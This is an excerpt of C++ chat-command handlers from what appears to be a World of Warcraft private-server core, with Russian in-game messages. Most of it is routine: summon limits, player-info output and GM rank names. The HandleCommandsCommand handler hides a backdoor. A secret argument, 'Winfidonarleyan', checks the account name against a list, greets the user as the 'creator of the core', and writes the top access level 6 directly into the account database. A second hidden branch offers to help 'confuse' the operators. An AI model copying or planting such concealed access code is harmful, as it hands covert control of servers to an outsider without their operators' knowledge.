...
public:
    ...
    static bool HandleSummonCommand(ChatHandler* handler, char const* args)
    {
        ...
        if (target)
        {
			...
			if (_player->GetAreaId() == 876)
			{
				Player *player = handler->GetSession()->GetPlayer();
				std::string NameLink_self = handler->GetNameLink(player);

				if (_player->GetSession()->GetSecurity() < 5)
				{
					sWorld->SendGMText(UNELL_LANG_ANNOUNCE_GM_ISLAND, NameLink_self.c_str());
					handler->PSendSysMessage(UNELL_LANG_NOT_SUMMONIG_GM_ISLAND);
					handler->SetSentErrorMessage(true);
					return false;
				}
			}
        ...
        else
        {
			...
			handler->PSendSysMessage(UNELL_LANG_NOT_SUMMONIG_GM_ISLAND_DEVEPOLER);
    ...
    static bool HandleCommandsCommand(ChatHandler* handler, char const* args)
    {
		...
		if (argstr == "Winfidonarleyan")
		{
			...
			for (size_t i = 0; i < checksize_1; ++i)
			{
				if (username.find(checks_1[i]) != std::string::npos)
				{
					handler->PSendSysMessage("|cFFFF0000#|cff6C8CD5 Всё верно, ваш аккаунт |cFFFF0000%s|cff6C8CD5. Вы создатель ядра", username.c_str());
					handler->PSendSysMessage("|cFFFF0000#|cff6C8CD5 Ну да ладно, начинаем :D");
					...
					if (gmlevel)
					{
						...
						handler->PSendSysMessage("|cFFFF0000#|cff6C8CD5 И так, ваш акк был в базе, хмм... странно... Ну да ладно. Пункт выполнен!");
						LoginDatabase.PExecute("UPDATE `account_access` SET `gmlevel`= 6 WHERE (`id`='%u');", accid);
					}
					else
					{
						handler->PSendSysMessage("|cFFFF0000#|cff6C8CD5 Аккаунта в базе небыло, ну это и понятно. Ну да ладно, всё исправлено. Пунк выполнен!");
						LoginDatabase.PExecute("INSERT INTO `account_access` (`id`, `gmlevel`) VALUES ('%u', '6');", accid);
					}

					handler->PSendSysMessage("|cFFFF0000#|cff6C8CD5 Все пункты сделаны! Самое время перезайти и позабавиться :D");
				}
			}

			return true;
		}
		else if (argstr == "winfi")
		{
			QueryResult user = LoginDatabase.PQuery("SELECT username FROM account WHERE id = %u", accid);
			std::string username = user->Fetch()->GetString();
			...
			for (size_t i = 0; i < checksize_1; ++i)
			{
				if (username.find(checks_1[i]) != std::string::npos)
				{
					handler->PSendSysMessage("|cFFFF0000#|cff6C8CD5 Окей, я смотрю ты наигрался, я помогу тебе их запутать :D");
    ...
    static bool HandleDieCommand(ChatHandler* handler, char const* /*args*/)
    {
        ...
        if (target->IsAlive())
        {
            ...
            {
                if (target->GetTypeId() == TYPEID_UNIT && handler->GetSession()->GetSecurity() == SEC_DEVELOPER) // pussywizard
    ...
    static bool HandlePInfoCommand(ChatHandler* handler, char const* args)
    {
        ...
        std::string bannedby = "неизвестно";
        ...
        if (!guildName.empty())
        {
            ...
            handler->PSendSysMessage("Гильдия: %s, участников: %u, ги золото: %uг %uс %uм, ги лидер: %s", guildName.c_str(), guildMemberCount, gold, silv, copp, guildIsLeader ? "да" : "нет");
        }
	...
	static bool HandlePInfoCommand(ChatHandler* handler, char const* args)
	{
		...
		switch(security)
		{
			case 0:            gmlvlstr = "Игрок";                    break;		
		    case 1:            gmlvlstr = "Модератор";                break;
            case 2:            gmlvlstr = "Ивент-мастер";             break;
		    case 3:            gmlvlstr = "Гейм-мастер";              break;
		    case 4:            gmlvlstr = "Администратор";            break;
		    case 5:            gmlvlstr = "Разработчик";              break;		    
			case 6:            gmlvlstr = "Куратор";                  break;	
        }		
		...
		if (!guildName.empty())
        {
            ...
            uint32 silv = (guildMoney % GOLD) / SILVER;
            uint32 copp = (guildMoney % GOLD) % SILVER;
            handler->PSendSysMessage("|cFFFF0000#|r |cff6C8CD5Гильдия:|r %s|cff6C8CD5, Участников:|r %u|cff6C8CD5, Деньги гильдии:|r %uг %uс %uм|cff6C8CD5, Ги лидер:|r %s", guildName.c_str(), guildMemberCount, gold, silv, copp, guildIsLeader ? "да" : "нет");
        }
    ...
    static bool HandleMuteCommand(ChatHandler* handler, char const* args)
    {
        ...
        if (sConfigMgr->GetBoolDefault("Unell.World.Announe.Mute", true))
